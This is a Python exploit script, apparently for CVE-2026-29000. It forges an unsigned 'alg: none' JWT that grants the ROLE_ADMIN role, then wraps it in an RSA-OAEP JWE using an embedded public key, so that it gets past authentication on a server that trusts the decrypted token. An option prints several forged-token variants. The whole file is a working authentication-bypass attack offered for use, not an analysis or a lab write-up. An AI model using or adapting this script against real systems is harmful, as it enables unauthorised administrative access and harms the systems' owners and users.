#!/usr/bin/env python3
"""CVE-2026-29000: Forge JWE-wrapped PlainJWT — matched to kernelzeroday PoC"""
import json
import time
import sys
import base64
from jwcrypto import jwk, jwe

JWKS_DATA = {
    "kty": "RSA",
    "e": "AQAB",
    "kid": "enc-key-1",
    "n": "lTh54vtBS1NAWrxAFU1NEZdrVxPeSMhHZ5NpZX-WtBsdWtJRaeeG61iNgYsFUXE9j2MAqmekpnyapD6A9dfSANhSgCF60uAZhnpIkFQVKEZday6ZIxoHpuP9zh2c3a7JrknrTbCPKzX39T6IK8pydccUvRl9zT4E_i6gtoVCUKixFVHnCvBpWJtmn4h3PCPCIOXtbZHAP3Nw7ncbXXNsrO3zmWXl-GQPuXu5-Uoi6mBQbmm0Z0SC07MCEZdFwoqQFC1E6OMN2G-KRwmuf661-uP9kPSXW8l4FutRpk6-LZW5C7gwihAiWyhZLQpjReRuhnUvLbG7I_m2PV0bWWy-Fw"
}

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")

def build_claims(subject, roles, exp_sec=3600, extra=None):
    claims = {"sub": subject, "$int_roles": roles, "exp": int(time.time()) + exp_sec}
    if extra:
        claims.update(extra)
    return claims

def serialize_plain_jwt(claims):
    header = {"alg": "none", "typ": "JWT"}
    h = b64url(json.dumps(header, separators=(",", ":")).encode())
    p = b64url(json.dumps(claims, separators=(",", ":")).encode())
    # No trailing dot — matches PoC
    return f"{h}.{p}"

def wrap_in_jwe(plaintext_bytes, pub_key):
    protected = {"alg": "RSA-OAEP-256", "enc": "A256GCM", "cty": "JWT"}
    token = jwe.JWE(plaintext_bytes, recipient=pub_key, protected=protected)
    return token.serialize(compact=True)

def forge_token(subject="admin", roles=None, exp_sec=3600, extra=None):
    roles = roles or ["ROLE_ADMIN"]
    claims = build_claims(subject, roles, exp_sec, extra)
    plain_jwt = serialize_plain_jwt(claims)
    pub_key = jwk.JWK(**JWKS_DATA)
    return wrap_in_jwe(plain_jwt.encode("utf-8"), pub_key)

if __name__ == "__main__":
    user = sys.argv[1] if len(sys.argv) > 1 else "admin"
    extra_claims = {}

    # Also generate variants with additional claim fields
    if "--variants" in sys.argv:
        now = int(time.time())
        variants = {
            "minimal": forge_token(user),
            "with_iss": forge_token(user, extra={"iss": "principal-platform"}),
            "with_all": forge_token(user, extra={"iss": "principal-platform", "iat": now, "role": "ROLE_ADMIN"}),
            "with_role_only": forge_token(user, roles=["ROLE_ADMIN"], extra={"role": "ROLE_ADMIN"}),
        }
        for name, token in variants.items():
            print(f"{name}:{token}")
    else:
        print(forge_token(user))
